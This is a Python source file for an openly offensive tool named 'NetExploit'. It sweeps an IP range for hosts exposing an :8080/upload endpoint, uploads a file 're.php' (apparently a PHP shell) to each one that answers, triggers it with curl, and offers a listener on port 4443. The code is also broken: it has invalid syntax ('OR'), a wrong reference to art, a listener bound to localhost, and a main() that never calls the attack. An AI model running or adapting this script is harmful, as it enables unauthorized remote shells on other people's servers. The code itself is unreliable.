import os
import sys
import time
import requests
import json
import urllib3
import urllib
import hashlib
import socket
from art import *
from termcolor import colored
sys.path.append('__init__')
import file_creator as file
import get_ip as ad
SEC_PATH = "/usr/bin/"

def listen(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("127.0.0.1", 4443))
    s.listen(4443)
    while True:
        conn, addr = s.accept()
        print("[+] Connection from: %s" % str(addr))
        data = conn.recv(1024)
        print("[+] Received: %s" % data)
        conn.send(data)
        conn.close()

def download_file(url, filename):
    # NOTE the stream=True parameter
    r = requests.get(url, stream=True)
    with open(filename, 'wb') as f:
        for chunk in r.iter_content(chunk_size=1024): 
            if chunk: # filter out keep-alive new chunks
                f.write(chunk)
                #f.flush()
    return filename

def get_file_size(filename):
    return os.stat(filename).st_size

def get_file_md5(filename):
    import hashlib
    hash_md5 = hashlib.md5()
    with open(filename, "rb") as f:
        for chunk in iter(lambda: f.read(4096), b""):
            hash_md5.update(chunk)
    return hash_md5.hexdigest()


def upload_file(url, filename):
    files = {'file': open(filename, 'rb')}
    r = requests.post(url, files=files)
    return r.text

def get_file_list(url):
    r = requests.get(url)
    return r.text

def banner():
    print(colored(art.text2art("NetExploit"), "red"))
    print(colored("[+] Author: Guidenevada", "green"))


def scan_network(ip_range):
    ip_list = []
    for i in range(1, 255):
        ip = ip_range + str(i)
        try:
            socket.inet_aton(ip)
            ip_list.append(ip)
        except socket.error:
            pass
    return ip_list

def uploader():
    
    urllib3.disable_warnings()
    
    target_ip_range = input(colored("[+] Enter target IP range: ", "blue"))
    
    ip_list = scan_network(target_ip_range)
    fast = 0.5
    slow = 3
    speed = input("[*] The slow scan can take 13 minutes and the fast one can take 3 minutes\n[+] Speed (fast/slow): ")
    if speed == "fast":
        timeo = fast
    elif speed == "slow":
        timeo = slow
    else:
        print("[-] Invalid speed")
        main()
    for ip in ip_list:
        try:
            url = "http://" + ip + ":8080/upload"

                
            print(colored("[*] Testing %s" % url, "blue"))
            r = requests.get(url, timeout=timeo)
            if r.status_code == 200:
                path_dir ="report/" + ip
                file.create_dir(path_dir)
                print(colored("[+] %s is vulnerable" % url, "green"))
                filename = "re.php"
                print(colored("[+] File size: %s" % get_file_size(filename), "green"))
                print(colored("[+] File md5: %s" % get_file_md5(filename), "green"))
                upload_file(url, filename)
                print(colored("[+] File %s uploaded" % filename, "green"))
                port = 4443
                print(colored("[+] Listening on port %s" % port, "green"))
                os.system("gnome-terminal --bash -c 'curl "+ url+"/re.php'")
                listener = input(colored("[*] Do you want to start a listener? (in test) [y/n]: ", "blue"))
                if (listener == "y") OR (listener == "Y"):
                    listen(port)
                else:
                    pass
                
        except Exception as e:
            print(e)
        
        except KeyboardInterrupt:
            print(colored("[-] User Interrupt", "red"))
            exit(1)
        except:
            print(("[-] Unknown error", 'red'))


def scanner(ip):
    url = input(colored("[+] Enter target URL: ", "blue"))
    ip = ad.get(url)
    print(colored("[+] Target IP: %s" % ip, "green"))
    print(colored("[+] Target URL: %s" % url, "green"))
    print(colored("[*] Testing %s" % url, "blue"))
    os.system("nmap -sV -Pn -p 8080 -oN report/%s.txt %s" % (ip, ip))


def main():
    print("[+] NetExploit")
if __name__ == "__main__":
    banner()
    main()
